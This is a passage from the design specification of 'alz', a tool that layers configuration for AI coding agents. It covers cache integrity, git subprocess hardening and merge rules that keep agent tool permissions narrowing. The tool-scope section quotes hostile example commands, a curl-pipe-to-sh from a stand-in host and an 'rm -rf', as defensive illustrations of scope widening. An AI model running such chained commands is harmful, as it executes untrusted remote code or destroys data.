format character (`layer-invalid`), a name that is not a safe relative path
(`layer-invalid`), reading each file within 16
MiB in all (`unreadable`), the content hash (`content-hash`), a `.env` file (`layer-invalid`),
then `layer.yaml`. The entry limit comes first so that the walk never goes past entry 2001. In
the build the name check comes first, before the content hash is computed or compared (below),
`layer.yaml` is read or any `.env` file is reported. A file of more than 16 MiB is unreadable in the
build too, at the place of a file that cannot be read in that order (the 16 MiB in all are not
limited there).

The TypeScript `alz` reads names from the file system as UTF-8 with U+FFFD in place of each
invalid sequence and then cannot open the file or folder by that name. So account resolution
reports `unreadable`, and the build fails with another error. For a pinned layer it decodes the
tree listing the same way but reads each blob by its id, so it probably writes and hashes the
name with U+FFFD instead of failing (reference drift, TASK-69; read from `src/core/files.ts`,
`src/resolve/reader-load.ts` and `src/resolve/tree-cache.ts`, not run).

**Cache integrity.** When a layer is read from the layer cache (§6), the lock has an entry for
the same `source`, and that entry's `sha` equals the commit just resolved, the layer's content
hash is computed over the cache directory and must equal the lock's, before `layer.yaml` is
required or parsed. A mismatch means the entry was edited or replaced after it was written. Every command
that rebuilds stops with an error that names the layer by its lock entry and source, gives its
cache directory and says to delete that directory: `build`, `check`, `diff`, `doctor`, `ls`,
`explain`, `lint` (on a repository), and `init`, where the error is a warning and no identity
is set. The message never contains file content. It is the error `cache`, no location, and reads
`cached layer '<name>' (<source>) no longer matches layer.lock: its files in <dir> changed after
they were cached; delete that directory and rebuild`, where `<name>` is the lock entry's name,
`<source>` the stack entry as written and `<dir>` the entry's directory in the cache, the last
two stripped (decision-26, class 1). Nothing is compared when the lock has no entry
for the source, or its `sha` differs (the ref moved, so new content is expected), or the layer
was just fetched or written rather than read from the cache. These commands treat "no entry" as
new content; account resolution (§7.13) does not (TASK-50.9), since it must treat anything it
cannot verify as a cache miss. An unpinned `path:` layer is a working tree, not a cache read,
and these commands do not check it; account resolution does check one outside the repository
against the lock (§7.13). For every layer, `layer.yaml` must be a regular file, never a link or a folder. The
check is `verifyCachedLayer`, which returns `ok` or `miss`; the account reader (§7.13,
TASK-50.9) uses it and treats a `miss` as a cache miss.

Two cache reads are also checked without the lock (§6): a `tree2@` entry against its git tree,
and an existing git entry against a fresh clone of the same commit.

A malicious lock still decides which commit and which cached copy a git source asks for. It can
serve a commit the remote has since removed, as long as that commit is cached, and skip the
network fetch, so no credential prompt appears. It cannot make a source read another URL's
entry (§6) or an entry whose content is not what the lock recorded.

---

## 6. Resolution algorithm

1. Read `layer.yaml` from the repo and resolve each `source` to a local directory at the
   pinned revision (using the lock unless `alz update` is run).
   A layer read from the cache is checked against the lock (§5.3). The cache is
   `$XDG_CACHE_HOME/agent-layerz` (default `~/.cache/agent-layerz`), located as "The layer
   cache" below says. A `github:` or `git:` layer
   is the directory `git-<sha256 of what is cloned, in hex>@<commit sha>`, where what is cloned
   is the remote URL exactly as it is passed to git (for `github:owner/repo`,
   `https://github.com/owner/repo.git`), or for a local repository its canonical absolute path.
   The URL is not rewritten, so two different URLs never share an entry and the same text always
   maps to the same one. An entry from an older version with a different name is ignored and
   fetched again, and is never removed. A cached git entry that already exists is not trusted over
   a fresh clone: when the lock has no entry to check it against, the build clones the commit,
   compares the two content hashes, discards the clone and stops with the "delete that directory"
   error on a difference. The error is `cache`, no location: `cached layer '<source>' differs from
   a fresh clone of the same commit: its files in <dir> changed after they were cached; delete that
   directory and rebuild`. A cache entry must be a real directory, never a link.

   **The layer cache** (TASK-52, TASK-53). Every command that resolves the stack (the list in
   §5.3 "Cache integrity") locates the cache in the same way, with the same function as account
   resolution (§7.13):
   - It is `$XDG_CACHE_HOME/agent-layerz` when `XDG_CACHE_HOME` is an absolute path. An empty
     or relative value counts as unset, as the XDG Base Directory specification says.
   - Otherwise it is `$HOME/.cache/agent-layerz`, with `HOME` as §7.13 "Environment" defines
     it. If that is not an absolute path either, the command stops with the error `cache`, no
     location, and the message
     `cannot locate the layer cache: set HOME or XDG_CACHE_HOME to an absolute path`.
   - A link in the cache root's own path is followed, because the person chose that path.
     alz resolves the path one component at a time and checks each resolved prefix before it
     looks at the next one (§9.1).
   - A cache root that touches an account folder (§9.1) is refused before anything in it is
     looked at. The error is `cache`, no location, with the message `the layer cache at <dir>
     touches an account folder or the home folder; set XDG_CACHE_HOME to another folder`.
   - An absolute `XDG_CACHE_HOME` that puts the cache root inside the repository being built,
     compared both as written and as real paths, is refused. The error is `cache`, no
     location, with the message `the layer cache at <dir> lies inside the repository; set
     XDG_CACHE_HOME to a folder outside it`.
   - Each missing folder of the cache root is created with mode `0700`. An existing folder
     keeps its mode.
   - A cache root that the effective user does not own, or that group or others can write, is
     refused, because what a stranger can write there would be read as a layer (as §7.13 "Both
     files" refuses such a file). The mode and the owner are those of the handle that is kept,
     read with `fstat`. The error is `cache`, no location, with the message `the layer cache at
     <dir> is not owned by you or can be written by group or others; fix its owner and mode, or
     set XDG_CACHE_HOME to another folder`. Each entry is opened relative to that handle, and one
     that another user owns is the error `cache`, no location: `cache entry <name> in the layer
     cache at <dir> is not owned by you; delete it and run alz again`.

   - A cache entry that is a link or any other name but a folder is the error `cache`, no
     location: `cache entry <name> in the layer cache at <dir> must be a folder, not a link or a
     file; delete it and run alz again`. An entry that was removed while alz used it gives
     `cache entry <name> in the layer cache at <dir> was removed while alz used it; run alz again`.
   - Any other failure to open or create the cache root is the error `cache`, no location:
     `cannot use the layer cache at <dir>`. The message names no operating system error. A
     failure to create or use a temporary entry in the open root, to write into it or to move it
     to its name, is the error `cache`, no location, with the message `cannot store '<source>' in
     the layer cache at <dir>` ("A failed fetch" below), because it is the layer that cannot be
     stored.

   `<dir>` is stripped as in every diagnostic (decision-26, class 1), and `<name>` is the entry's
   own name (`git-<hex>@<sha>`, `tree2@<id>` or `pathref@<hex>-<sha>`). The entries inside the
   cache are never followed through a link (above).

   The TypeScript `alz` differs (reference drift, TASK-52, TASK-53):
   - it uses `XDG_CACHE_HOME` whenever the variable is set, so an empty value puts the cache in
     the working directory;
   - it refuses neither a cache inside the repository nor one in an account folder;
   - it creates missing folders with mode `0777` minus the umask;
   - it does not check the owner or the mode of the cache root or of an entry.

   **Layers in or around an account folder** (TASK-52). Every command that resolves the stack
   finds the directory of a `path:` layer, pinned or not, and of a local `git:` source, from the
   path as written:
   - relative to the repository root;
   - one component at a time;
   - following each link itself;
   - checking each resolved prefix before it looks at the next one.

   A directory that touches an account folder (§9.1) stops the command before any name in it
   is looked at, and before git runs there, whether or not a link planted in the repository
   leads to it. An account folder that is itself reached through a link counts as that folder:
   alz lists `$HOME` for the names it knows (`~/.claude`, `~/.claude.json`, `~/.codex`,
   `~/.claude-*` and `~/.codex-*`), reads each with `lstat`, and for each that is a link takes the
   real path it leads to as an account folder too, so a layer in `~/dotfiles/claude` is refused
   when `~/.claude-x` is a link to it. Only the names in `$HOME` are looked at, never what an
   account folder holds. The error is `source`, no location, with the message `layer '<source>' touches
   an account folder or the home folder; alz never reads there`. `<source>` is stripped.

   Files inside a layer, a cache entry or a temporary clone are then opened relative to the
   folder that holds them, never through a link. Each check of type and size is made with
   `fstat` on the handle that is read (decision-27), so a name swapped for a link or a pipe
   between two calls cannot change what was checked.

   A `path:` layer whose directory is not there, or is not a directory, whatever the reason (a
   missing folder on the way, a name on the way that is not a folder, more than 40 links, or
   another failure of the operating system), is the error `source`, no location, with the message
   `layer directory not found for '<source>'`. A pinned `path:` layer whose ref does not give a
   layer tree is the error `source`, no location: `cannot resolve ref <ref> for '<source>': not a
   git repo, unknown ref, the layer did not exist at that ref, or its path is not a plain
   directory there`. The walk that opens a layer directory has its own words for a failure when a
   caller reports it for a layer given as `<source>`: the error `layer`, no location, `layer
   '<source>' is not a directory` for a missing name or a name that is not a folder, and `layer
   '<source>' cannot be opened` for too many links or any other failure; an account folder or the
   home folder is the error `source` above in every case. Stack resolution uses the first two
   messages of this paragraph.

   The TypeScript `alz` resolves the path with `realpath` and makes no such check in these
   commands, so it opens the files of such a layer (reference drift, TASK-52).

   **A failed fetch** (TASK-65). Three git steps can fail for a `github:` or `git:` source: the
   clone, `git rev-parse` of the ref as a commit (of the lock's `sha` when the lock has an entry
   for the source), and the checkout of that commit. Any of them stops the command with the
   error `source`, no location and the message `cannot fetch '<source>': <line>`. `<source>` is
   the stack entry as written, ref included; it holds no credentials (§5.2). `<line>` comes
   from the standard error of the git call that failed, in this order:
   1. decode it as UTF-8, with U+FFFD in place of each invalid sequence;
   2. split it at each line feed (a carriage return does not end a line);
   3. remove control and format characters from each line (decision-26, class 1);
   4. remove Unicode White_Space from both ends of each line;
   5. take the first line that is not empty.

   When no line is left, the message is `cannot fetch '<source>'` with nothing after it.
   `<source>` is stripped as in step 3. Git's standard error carries what the remote and the
   transport (for example `ssh`) wrote, so it is untrusted. Nothing else of git's standard
   output or standard error is printed. Git and the programs it starts, such as `ssh`, never
   prompt: alz runs them so that they cannot reach the terminal ("Git subprocesses" below),
   because alz could neither see nor sanitise what they write there. A key with a passphrase
   therefore has to be in an agent, and a host whose key is not yet known fails the fetch with
   the message above (TASK-70; the TypeScript `alz` leaves `ssh` able to prompt, reference
   drift).

   Once git has succeeded, a failure to read the clone or an existing entry for the hash
   comparison above, or to move the clone into the cache, is not a fetch failure:
   - a name that is not valid UTF-8 is the §5.3 "File names" error;
   - anything else is the error `cache`, with no location and the message
     `cannot store '<source>' in the layer cache at <cache directory>`.

   The TypeScript `alz` differs (reference drift, TASK-68):
   - it trims git's whole standard error with JavaScript's `trim` (which also removes U+FEFF)
     and then takes the first line, so a carriage return or trailing white space stays on that
     line when more lines follow, and a line of control characters counts as a line;
   - it strips neither the source nor git's line;
   - it ends the message with `: ` when there is no line;
   - it reports the read and move failures above as `cannot fetch` with nothing after the
     colon.

   **Git subprocesses** (TASK-63, TASK-70; decision-24). Every git call that resolves a source
   (`clone`, `rev-parse`, `checkout`, `ls-tree`, `cat-file`) runs the `git` found on `PATH`, with
   an argument list and no shell. A revision follows `--end-of-options`, and `--` comes only
   before paths. Refs and object ids are validated before they are used (§5.2, §5.3).
   - **Version.** alz needs git 2.30 or later, the first version whose `rev-parse` accepts
     `--end-of-options`.
     - Before the first git call of a command, and only when a source needs git, alz runs
       `git version`.
     - A version below 2.30 stops the command with the error `git`, no location, and the
       message `alz needs git 2.30 or later; found <version>`. `<version>` is the version
       git printed, stripped.
     - Output that does not read as `git version <major>.<minor>…` gives
       `an unreadable version` in place of `<version>`, and a git that cannot be started gives
       `found none`.
     - The note on 2.44 (`GIT_NO_LAZY_FETCH`, below) still applies, and so does the advice to
       use 2.45.1 or later when a local `git:` source may be an untrusted repository
       (`docs/target-facts.md` §11).
   - **Environment.** Each call gets alz's own environment with these changes and no others:
     - Removed: `GIT_DIR`, `GIT_WORK_TREE`, `GIT_INDEX_FILE`, `GIT_OBJECT_DIRECTORY`,
       `GIT_ALTERNATE_OBJECT_DIRECTORIES`, `GIT_COMMON_DIR`, `GIT_NAMESPACE` and
       `GIT_CEILING_DIRECTORIES`, which point git at another repository. Also removed:
       `GIT_CONFIG_PARAMETERS`, `GIT_CONFIG_COUNT` and every `GIT_CONFIG_KEY_<n>` and
       `GIT_CONFIG_VALUE_<n>`, which carry the `-c` options of a parent git.
     - Set: `GIT_TERMINAL_PROMPT=0`.
     - A clone of a source classed as a remote may use `https` and `ssh` only. It is run with
       `-c protocol.allow=never -c protocol.https.allow=always -c protocol.ssh.allow=always`,
       with `GIT_PROTOCOL_FROM_USER=0`, and with `GIT_ALLOW_PROTOCOL=https:ssh`. git uses
       `GIT_ALLOW_PROTOCOL` before every `protocol.*.allow`, the user's configuration included,
       so this is the setting that a user's `protocol.ext.allow=always` cannot undo. A
       `GIT_ALLOW_PROTOCOL` of the user's own can only narrow it: the value is cut down to the
       `https` and `ssh` that it names, and is empty, allowing nothing, when it names neither
       (§7.12). A remote URL that is not `https` or `ssh` (`http://`, `git://`, `file://` by way of
       a rewrite) therefore fails the clone with the failed fetch of "A failed fetch".
     - A clone of a local `git:` source is run with `--no-local`: git copies the objects through its
       own transport, and never hard-links the source's object files into the cache.
     - Every call that reads a pinned layer's tree also sets `GIT_NO_REPLACE_OBJECTS=1`,
       `GIT_NO_LAZY_FETCH=1` and `GIT_LITERAL_PATHSPECS=1` (below).
   - **Which git.** alz looks `git` up once per run, in the `PATH` of its own environment, folder
     by folder, and takes the first regular file with an execute bit. An empty entry and a relative
     entry are skipped, because they name the working directory, which may be the repository being
     read. The version check and every call run that one absolute path. When no folder holds git
     the error is `found none` (above). A copy of alz that cannot be started, as when the running
     executable has gone, is the error `git` with no location and the message `alz cannot find its
     own executable, which it needs to run git`. git and its version check are started only when a
     source needs a clone or a pinned `path:` layer reads its tree: a layer that the lock pins and
     the cache holds is read without them.

     A git hook receives `GIT_INDEX_FILE` and, in a linked worktree, `GIT_DIR`. So when alz
     runs from a hook, these calls never read or write the user's index or repository. The
     user's git configuration files, credential helpers, `url.<base>.insteadOf` rules and ssh
     settings keep working. Calls on the repository being built (§9.4) are not part of this
     rule; their environment is §9.4's.
   - **No terminal.** Git and the programs it starts never reach the terminal.
     - alz starts git through a copy of itself, run with an internal argument that is not
       part of the command-line interface. The copy starts a new session (`setsid`) and then
       runs git as its child, so git and `ssh` have no controlling terminal and cannot open
       `/dev/tty`. The copy writes one byte to its standard output once the session has started,
       before git runs, and alz takes it off the stream: alz treats the copy's process group as
       git's only after that byte.
     - **Abandoned calls.** git runs in a session of its own, so an interrupt that reaches alz
       does not reach it. The copy therefore waits for git and ends git's whole process group,
       `ssh` included, when alz is gone (interrupted or killed), and alz ends the group when it
       abandons a call (an error, a panic or the deadline below). No git or `ssh` is left running
       after alz ends. The copy ends with git's exit status. When alz ends a call it ends the
       copy and, once the byte has arrived, the group; if the byte arrives after the copy was
       ended, the group is ended then. Once alz has the copy's exit status it never signals that
       process id again, since the system may have given it to another process; and it reads
       git's output for half a second more at most, then returns git's result, so a process that
       outlives git and keeps the pipes open (an `ssh` kept for later connections) does not hold
       the call to its deadline.
     - Standard input is the null device, except for the batch calls whose input alz writes.
     - A SMOKE run (TASK-55.4.3, Darwin 25.6, git 2.50.1) started a pseudo-terminal with
       `script(1)`. A process that opened `/dev/tty` there succeeded when it was started
       directly, and failed with ENXIO ("Device not configured") when it was started through
       the copy. The copy must not be a process group leader when it calls `setsid`, which is
       why the runner starts it as an ordinary child.
     - The user's `core.sshCommand` and `GIT_SSH_COMMAND` are left as they are.
     - An `ssh` agent keeps working, and so does a graphical `SSH_ASKPASS` program, which does
       not use the terminal.
   - **Deadlines.** A clone may run for 10 minutes, and any other git call for 2 minutes. When
     a call runs longer, alz ends git's whole process group, `ssh` included, and the step
     fails:
     - for a `github:` or `git:` source, with `cannot fetch '<source>': git did not finish
       within <n> seconds`, where `<n>` is 600 or 120;
     - for a pinned `path:` layer, with `cannot read '<source>' at <ref>: git did not finish
       within <n> seconds`.
   - Only the machine-readable output that each call asks for is read from git's standard
     output. Its standard error is read only as "A failed fetch" says.

   The TypeScript `alz` differs (reference drift, TASK-63, TASK-70):
   - it passes its whole environment to these calls, except `GIT_ALLOW_PROTOCOL` on a guarded
     clone, and allows the transports that the user's configuration allows;
   - it leaves `ssh` able to prompt on the terminal;
   - it sets no deadline and checks no version.

   **Other messages of resolution** (TASK-55.4.11). Each is stripped as every diagnostic is
   (decision-26, class 1) and has no location unless it says so:
   - `source`: `'<source>': a local git: path must not contain '..' segments; use a path without
     them`, for a local `git:` path with a `..` segment (§7.12), and `'<source>': not a valid
     file:// URL` for a `file://` URL that names no path.
   - `source`: `cannot find the working directory`, when the process has none.
   - `git`: `alz cannot find its own executable, which it needs to run git`, when alz cannot
     start its copy for the call (above).
   - `layer`: `layer.yaml in layer '<source>' cannot be read`, for a `layer.yaml` that cannot be
     opened or read for another reason than "missing" and "not a regular file" (§5.3).
   - `env-file`, at `<layer>:<path>`: `layers must not contain .env files; remove it`.
   - `cache-index` (a warning, §6 below): `cache entry pathref@<hex>-<sha> in the layer cache at
     <dir> cannot be written`. A folder at that name is the error `cache`: `cache entry
     pathref@<hex>-<sha> in the layer cache at <dir> is a folder; delete it and rebuild`.
   - `lock`, at `layer.lock`: `layer.lock must be a regular file, not a link or a folder`,
     `layer.lock cannot be read`, and, for a field that is missing or invalid, `the lock's
     <field> is missing or not valid; delete the lock and rebuild`, where `<field>` is one of
     `the document`, `lockVersion`, `visibility`, `layers`, `layers[].name`, `layers[].source`,
     `layers[].rev`, `layers[].sha`, `layers[].contentHash`, `files`, `a key of files` and
     `a value of files`. The value is never printed.

   A pinned `path:` layer is `tree2@<git tree id>`, where the tree is the layer's directory at the
   commit. The prefix is the format version: entries named `tree@<id>`, written by older versions
   with `git checkout-index`, may differ from the tree by attribute conversions, so they are
   ignored and written again (and never removed). Reading the tree:

   - The top of the repository that `git rev-parse --show-toplevel` reports is walked like a
     layer directory (§6 "Layers in or around an account folder") before git is asked anything
     else there. One that touches an account folder, which `core.worktree` or a `.git` file can
     arrange, is refused with the error `source` of that paragraph, naming the layer.
   - Standard output of the git calls that read the tree is read up to 64 MiB for a listing or
     object contents (`ls-tree -r`, `cat-file --batch`) and 64 KiB for a one-line answer. More is
     a failed read, `cannot read '<source>' at <ref>: git wrote more output than alz accepts`.
   - `git ls-tree` must list the layer's path as a directory (mode `040000`, type `tree`), so a
     symbolic link or a submodule entry, whose recorded id could be any tree id, is refused as an
     unresolvable ref.
   - Every git call that reads the tree sets `GIT_NO_REPLACE_OBJECTS=1` and
     `GIT_NO_LAZY_FETCH=1`: no replace ref swaps an object, and no partial clone fetches one.
     Git honours `GIT_NO_LAZY_FETCH` from version 2.44; an older git may still fetch a missing
     blob from a partial clone's promisor remote.
   - The repository being built must hold every blob the tree lists, as a blob
     (`git cat-file --batch-check`), before a cached entry is trusted or a new one is written, so
     another repository's tree id never selects an entry whose content this repository lacks.
   - Links and submodule entries inside the tree are skipped, as the loader skips links in a git
     or unpinned layer, so a hub with `CLAUDE.md -> AGENTS.md` keeps working. They are not
     written, and a link found in an entry is a change. A path with a backslash, a `.` or `..`
     segment or a `.git` segment, or one that is not valid UTF-8 (§5.3 "File names"), is
     refused. The same rule is the one for every relative path in `layer.lock` and in a layer
     (`SafeRelPath`): the `.git` comparison ignores ASCII case (`.GIT` names `.git` on a
     case-insensitive file system), and a segment `.git.` or `.git ` (a trailing dot or space,
     which Windows drops) counts as `.git`.
   - A tree with two paths that are equal after Unicode NFC normalisation and lowercasing, or a
     file and a folder with such names, is refused before anything is written, because one file
     system would merge them.
   - These refusals are the error `layer`, with no location, and name the layer by its source and
     never a path: a path that is not valid UTF-8 gives the message of §5.3 "File names"; a path
     that is not safe gives `the git tree of layer '<source>' lists a path with a backslash, a
     '.', '..' or '.git' segment; rename it`; two paths that one file system would merge give
     `the git tree of layer '<source>' lists two paths that one file system would merge (equal
     after Unicode normalisation and lowercasing); rename one`. Every path the tree lists is
     judged, links and submodules too, but only the files are compared for merging.
   - A layer at the top of its repository (`git rev-parse --show-prefix` is empty) is the commit's
     own tree. A git step that fails before the tree is listed, because the folder is not in a
     repository or the ref is unknown, is `cannot resolve ref`; one that fails while the tree is
     read, or that does not finish, is `cannot read '<source>' at <ref>: <line>`, and so is a
     blob the repository does not hold (`the repository does not hold the file '<path>'`).

   Next to each `tree2@` entry the commands that resolve a pinned `path:` layer keep an index
   entry, `pathref@<sha256 of the layer directory's real path>-<commit sha>`, that names the
   tree, so account resolution can find the entry without git (§7.13 "No fetch on resolve").
   It is only a pointer: whatever it names is still checked against the lock. A directory at
   its name is the cache error ("delete it and rebuild"); any other failure to write it, such as
   a read-only cache, is the warning `cache-index` and does not stop the build, and account
   resolution reports a miss until the entry exists.

   The entry is written from the tree's own blobs (`git cat-file`), each checked against its id,
   not by `git checkout-index`, so no attributes file of the working repository
   (`.gitattributes`, `info/attributes`), no `core.attributesFile`, no `core.autocrlf` and no
   filter (LFS included, so an LFS file is its pointer text) changes a byte, and in-tree
   attributes are not applied either. Files get mode `0644`, or `0755` when the tree records an
   executable. The written entry is verified before it gets its name, and every later read of a
   `tree2@` entry is verified too, whatever the lock says: it is compared with `git ls-tree -r`
   of that tree, with every file present with the blob id git computes over its bytes (no
   filters), the executable bit equal to the mode, no extra file and no link, and the entry itself
   a real directory. Names the loader skips (`.DS_Store`, `.git`, `node_modules`) are ignored in
   an entry unless the tree has them. Names are compared in NFC, because HFS+ returns NFD and APFS
   keeps the form it was written in. A difference stops the build with the "delete that
   directory" error, so an entry whose tree is unchanged but whose commit moved (docs commits in
   a hub) is still checked. Repository-supplied text in these errors (paths, sources) is quoted,
   with control and format characters removed.

   Changes a user can see in 0.x: a symlinked `layer.yaml` is refused; in-tree attributes (eol,
   ident, filters such as LFS) are no longer applied to pinned layers; paths with a backslash or a
   `.git` segment are refused; links in a pinned layer are skipped; a hub cloned without blobs
   (`--filter=blob:none`) and pinned to a ref whose files were never fetched fails with "does not
   hold the file" (run `git fetch` for that ref, or use a full clone); and every git and tree cache
   entry is fetched or written once again under its new name.
2. Validate the stack: visibility ordering (§3.1), layer schema, no duplicate layer names.
   The layers are first read, each by its own rule (steps above and §5.3): a failure of one
   entry does not stop the others, so one run reports every problem, in stack order. The layer
   schema errors are the `layer` errors of §5.1, at `<source>:layer.yaml`, where `<source>` is the
   stack entry as written. Then, over the layers that were read, in stack order:
   - A name that an earlier layer has is the error `duplicate-layer`, with no location and the
     message `layer name '<name>' is used by both '<source>' and '<source>'`, naming the earlier
     layer's entry first.
   - A layer that is more public than a layer before it is the error `visibility` at the later
     layer's entry, one for each such earlier layer: `<visibility> layer '<name>' cannot extend
     <visibility> layer '<name>'; order the stack from most public to most private`.

   `<source>` is stripped (§10.1). Each `.env` file of a layer is the error `env-file` at
   `<layer>:<path>` (§5.3), and does not stop the layer from being read. A directory of an
   unpinned `path:` layer that holds a name that is not valid UTF-8 is the error `layer` of §5.3
   "File names"; one that holds a name that is not a safe path or a file that cannot be read is
   the error `layer` with the message `layer '<source>' holds a file that cannot be read or a name
   that is not allowed`. The same two refusals for a `git:` or `github:` clone are the first the
   error `layer` of §5.3 and then the error `cache` `cannot store '<source>' in the layer cache
   at <dir>` (above); for an existing `tree2@` entry the first is that error `layer`, and the
   second is the "no longer matches git tree" error (`cached layer '<source>' no longer matches
   git tree <id>: its files in <dir> changed after they were cached; delete that directory and
   rebuild`, the error `cache`, no location).
3. For each item type, collect items from all layers **in stack order** (general → specific).
4. Apply the merge rule for that type (§7).
5. Check: slots filled, budgets met, leak guard on public layers, permission floor kept.
6. Render each target with its adapter (§8) into a temp dir.
7. Diff against the repo. Write only generated paths. Update `layer.lock`.

The build is **pure and deterministic**: the same inputs give byte-identical outputs
(sorted keys, stable ordering, no timestamps in file bodies).

**Name order.** Wherever alz sorts names, paths or keys, it compares them by Unicode code
point (TASK-64). This covers a layer's files and its content hash (§5.3), filename order
(§7.1), the keys of every JSON object alz writes, `layer.lock` included, and the entries of
the allow state (§7.13). The first position where two strings differ decides: the string with
the smaller code point there sorts first, and a string that is a prefix of the other sorts
first. A path is one `/`-separated string, not a list of components, so `a-b` sorts before
`a/b` (`-` is U+002D, `/` is U+002F). There is no locale, case folding or Unicode
normalization, and a key made of digits is a string like any other: `10` sorts before `9`,
and `-x` before `5`. This is the order of the strings' UTF-8 bytes, which is Rust's `str`
order. It is not UTF-16 code unit order, which JavaScript's default `sort()` and `<` use: that
order puts a character above U+FFFF before one in U+E000–U+FFFF, and the TypeScript `alz`
sorts that way (reference drift, decision-30). A name or key that holds a lone surrogate, for
example from a YAML `"\uD800"` escape, has no UTF-8 form and is an error.

---

## 7. Merge rules

General rule: **the more specific layer wins on conflicts, collections are combined, and
security can only get stricter.**

### 7.1 Instructions
- Concatenate all `instructions/*.md` in stack order, then by filename within a layer (name
  order, §6).
- Each layer's block is wrapped in `## <Layer kind>: <layer name>`.
- A layer may **suppress** a block from a more general layer: `instructions/<same-filename>`
  with frontmatter `mode: replace` replaces it, and `mode: remove` drops it.
- The composed result becomes `AGENTS.md`. `CLAUDE.md` is generated as an import of
  `AGENTS.md` plus a `## Claude-specific` block built from any `targets/claude/CLAUDE.extra.md`.
- The `instructions_max_lines` budget is enforced. Long standards should be **skills**, not
  instructions.
- Both budgets count the composed `AGENTS.md`, its header and Commits section included. Lines
  are the line feeds it holds, and bytes its UTF-8 length. Over a budget is the error `budget`,
  without location: `AGENTS.md has <n> lines; instructions_max_lines is <max>. Move long
  standards into skills`, or `AGENTS.md is <n> bytes; instructions_max_bytes is <max>`
  (TASK-55.6).
- `mode` takes `append` (the default when it is absent: the file adds a block), `replace` or
  `remove`. Any other value is an `instructions` error. A `replace` or `remove` with no block of
  that file name in a more general layer is `unresolved`, which a lint of one layer leaves out
  (§10.1).
- Each block's text, and the text of `CLAUDE.extra.md`, is trimmed of Unicode `White_Space` at
  both ends, and a block that is empty after trimming is dropped. The TypeScript `alz` trims with
  JavaScript's `trim`, which also removes U+FEFF (reference drift, TASK-55.5.4).
- `<Layer kind>` is the layer's `kind` as written, with its first character in upper case
  (`repo` gives `Repo`). Like the layer's name, it is text from the layer, so the Rust `alz` writes
  it without control and format characters (the class 1 set of §10.1); the TypeScript `alz`
  writes it as it is (reference drift, TASK-55.6.3).

### 7.2 Agents
An agent source is Markdown with YAML frontmatter, written in a **neutral schema**:

```yaml
---
name: architect                      # required, kebab-case, unique after merge
description: When to use this agent  # required
role: planning                       # used for model routing (§7.8)
model: inherit                       # or a logical model id from models.yaml
tools: [read, grep, glob, write:docs/**, bash:mise run *]   # neutral tool vocabulary
skills: [arch-standards, adr, stack-conventions]           # preload list; slots allowed
isolation: worktree                  # optional: none | worktree
permission_mode: default             # optional
memory: project                      # optional: none | project | user
targets: [claude, codex]             # optional restriction
---
<system prompt body>
```

Overlay (`<name>.overlay.md` in a more specific layer):

```yaml
---
extends: architect
mode: extend          # extend (default) | replace
description: ~        # ~ = keep inherited; a value replaces it
skills: +[domain-glossary, cost-guardrails]   # "+[…]" append, "-[…]" remove, "[…]" replace
tools: -[write:docs/**] +[write:docs/adr/**]  # see narrowing rule below
model: ~
---
<this text is appended to the body under "## <layer kind> context: <layer name>">
```

Rules:
- **Scalars:** the most specific value wins.
- **Lists (`skills`):** apply `+`, `-` and replace in stack order. The result is de-duplicated
  and order is kept.
  An overlay writes a list edit as a YAML list, which replaces the inherited list, or as a
  string of segments in the order they apply: `+[a, b]` appends, `-[c]` removes and `[d]`
  replaces. White space between segments is free. Items are split at commas and trimmed. One
  pair of matching quotes around an item is removed, an empty item is left out, and an item
  cannot hold `]`. An empty string, `~` or a field left out keeps the inherited list. Note
  that a plain YAML list replaces here but adds in `permissions.yaml` (§7.6).
- **`tools` (narrowing rule):** an overlay may only remove tools or narrow a tool's scope.
  It may not add a tool the base didn't have, unless the overlay sets `allow_widen: true`
  **and** the layer is not public. Violations are build errors (code `tool-widen`) that name
  the agent, the layer and the entry. After the overlay's edits, every entry must be
  **covered** by an entry of the base. A base entry covers another entry of the same tool when
  one of these holds:
  - the base entry has no scope, or the two scopes are equal;
  - for a path scope (`read`, `write`, `edit`, `grep`, `glob`, `notebook_edit`): the last segment
    of the base scope is `**`, and the segments of the other scope (split at `/`) start with the
    base scope's other segments, compared whole and as written. The other scope must have no `.`
    or `..` segment. So `docs/**` covers `docs/adr/**` and `docs/a.md`, but not
    `docs-private/a.md`;
  - for a command scope (`bash`): the base scope ends in `*`, the other scope starts with the base
    scope's text before its trailing `*`s, and the rest of the other scope holds no shell
    operator: `;`, `&`, `|`, `<`, `>`, `(`, `)`, a backtick, a line feed or a carriage return. So
    `mise run *` covers `mise run test`, but neither `mise run test && rm -rf x` nor
    `mise run $(x)`.

  Any other wildcard covers only an equal scope, and the scope of any other tool is covered only
  by an equal one. The TypeScript `alz` reads every scope that ends in `*` as covering any scope
  that starts with its text before the stars. So `write:docs*` covers `write:docs-private/**`,
  and `bash:mise run *` covers `bash:mise run test; curl https://example.invalid/x | sh`: an
  overlay can widen an inherited tool while the build takes it for narrowing. The Rust `alz`
  refuses both (reference drift, TASK-55.5.6).

  More precisely:
  - A path base whose segments other than the last end in `**` as well (`docs/**/**`) covers
    only an equal scope, so that covering stays transitive.
  - `docs/**` covers `docs` itself, and `**` covers any path without a `.` or `..` segment.
    Braces are literal text.
  - A candidate path scope that starts with `~` or `/`, holds a `\`, or starts with a drive
    letter and `:` (`C:`) is covered only by an equal scope, because it is not a path relative
    to the repository. The TypeScript `alz` compared it by prefix (reference drift, TASK-55.5).
  - "The base" is the agent that the overlay refines, including the overlays already applied
    to it, so a later overlay cannot widen again what an earlier one narrowed.
  - An overlay that widens is not applied.
  - `allow_widen: true` in a public layer is an error (code `tool-widen`), even when the overlay
    edits no tools or has no base.
  - The tool vocabulary is `read`, `write`, `edit`, `grep`, `glob`, `bash`, `web_fetch`,
    `web_search`, `agent`, `notebook_edit`, `todo_write` and `skill`, plus any name that starts
    with `mcp__`. Any other tool is an `agent` error, inside `-[…]` too. An empty scope
    (`write:`) is taken as written.
- **Body:** `extend` appends a section per layer. `replace` replaces the whole body (the
  build warns about it).
- `mode: replace` with no base means "define new". An overlay whose `extends` target can't
  be found is an error.
- Two layers defining a **base** (non-overlay) agent with the same name is an error. Use an
  overlay or `mode: replace` instead.
- **Native fields:** a `claude:` (or `codex:`) map holds target fields the neutral schema does
  not model, such as `effort`, `maxTurns` or `color`. They are passed through
  to that target only, and overlays deep-merge them (§7.9's merge). Keys with a neutral field
  are rejected inside the map (code `agent`):
  - in `claude:`: `name`, `description`, `tools`, `model`, `permissionMode`, `skills`,
    `isolation` and `memory`;
  - in `codex:`: `name`, `description`, `model` and `developer_instructions`.

  `claude.mcpServers`, `codex.mcp_servers` and the `hooks` of either target are refused in an
